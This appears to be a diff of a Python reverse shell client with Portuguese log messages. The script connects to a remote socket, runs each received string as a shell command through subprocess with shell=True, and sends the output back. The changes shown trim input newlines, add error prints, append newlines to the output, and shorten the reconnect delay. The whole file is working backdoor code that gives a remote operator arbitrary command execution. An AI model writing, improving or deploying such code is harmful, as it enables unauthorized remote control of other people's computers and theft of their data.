@@ -23,16 +23,18 @@ def listen(s):
                 s.close()
                 exit(0)
             else:
-                cmd(s, data)
+                cmd(s, data[:-1])
     except:
+        print('Erro na listen')
         error(s)
 
 def cmd(s, data):
     try:
         proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         saida = proc.stdout.read() + proc.stderr.read()
-        s.send(saida)
+        s.send(saida+'\n')
     except:
+        print('Erro no cmd')
         error(s)
 
 def error(s):
@@ -47,6 +49,6 @@ def main():
             listen(s_conectado)
         else:
             print('Conexão deu erro, tentando novamente')
-            time.sleep(10)
+            time.sleep(5)
 
 main()
